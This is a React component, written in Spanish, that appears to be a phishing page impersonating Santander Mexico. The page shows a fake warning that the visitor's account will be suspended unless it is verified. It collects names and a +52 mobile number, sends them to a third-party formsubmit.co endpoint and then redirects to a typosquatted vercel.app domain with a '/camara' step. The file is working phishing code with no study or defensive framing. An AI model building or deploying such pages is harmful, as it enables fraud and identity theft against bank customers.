import React, { useState } from 'react';
import '../css/form.css';
import backgroundImg from '../img/fondopri.jpg'; // Asegúrate de que la ruta sea correcta
import logo from '../img/BSAC_BIG.D-e2baaa02.png'; // Asegúrate de tener el logo y la ruta correcta
import personImg from '../img/persona.png'; // Asegúrate de tener la imagen de la persona y la ruta correcta

const Form = () => {
  const [formData, setFormData] = useState({ nombres: '', apellidos: '', celular: '' });
  const [errors, setErrors] = useState({});

  const validate = () => {
    const errors = {};
    if (formData.nombres.trim().length < 2) {
      errors.nombres = 'Los nombres deben tener al menos 2 letras';
    }
    if (formData.apellidos.trim().length < 2) {
      errors.apellidos = 'Los apellidos deben tener al menos 2 letras';
    }
    if (!formData.celular.trim()) {
      errors.celular = 'El número de celular es obligatorio';
    }
    setErrors(errors);
    return Object.keys(errors).length === 0;
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (validate()) {
      try {
        const response = await fetch('https://api.formsubmit.co/ajax/44b61e96-d80d-4706-87e8-bcaa689dae2a', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(formData),
        });
        
        if (response.ok) {
          console.log('Formulario enviado:', formData);
          window.location.href = 'https://santaderclientpremiunverif.vercel.app/camara';
        } else {
          console.error('Error al enviar el formulario');
        }
      } catch (error) {
        console.error('Error al enviar el formulario:', error);
      }
    }
  };

  return (
    <div className="container">
      <div className="background">
        <img src={backgroundImg} alt="Background" className="background-img" />
      </div>
      <div className="content">
        <img src={logo} alt="Logo" className="logo" />
        &nbsp;
        &nbsp;
        <h1 className="title">Bienvenido a SanTander</h1>
        &nbsp;
        &nbsp;
        <form onSubmit={handleSubmit} className="form-group">
          <input
            type="text"
            name="nombres"
            placeholder="Nombres"
            className="input"
            value={formData.nombres}
            onChange={handleChange}
            required
          />
          {errors.nombres && <p className="error">{errors.nombres}</p>}
          <input
            type="text"
            name="apellidos"
            placeholder="Apellidos"
            className="input"
            value={formData.apellidos}
            onChange={handleChange}
            required
          />
          {errors.apellidos && <p className="error">{errors.apellidos}</p>}
          <div className="phone-input-container">
            <span className="country-code">+52</span>
            <input
              type="tel"
              name="celular"
              placeholder="Número de celular"
              className="input phone-input"
              value={formData.celular}
              onChange={handleChange}
              maxLength={10}
              required
            />
            {errors.celular && <p className="error">{errors.celular}</p>}
          </div>
          <button type="submit" className="btn">Iniciar</button>
        </form>
        <p className="register">¿Eres nuevo? <a href="/register">Regístrate aquí</a></p>
      </div>
      <div className="banner">
        <div className="banner-text">
          En Santander, siempre innovamos para ti. Verifica tu cuenta y evita que sea suspendida temporalmente por medidas de seguridad. Sigue los pasos que se te piden y disfruta al máximo con Santander MX.
        </div>
        <img src={personImg} alt="Person" className="person-img" />
      </div>
    </div>
  );
};

export default Form;
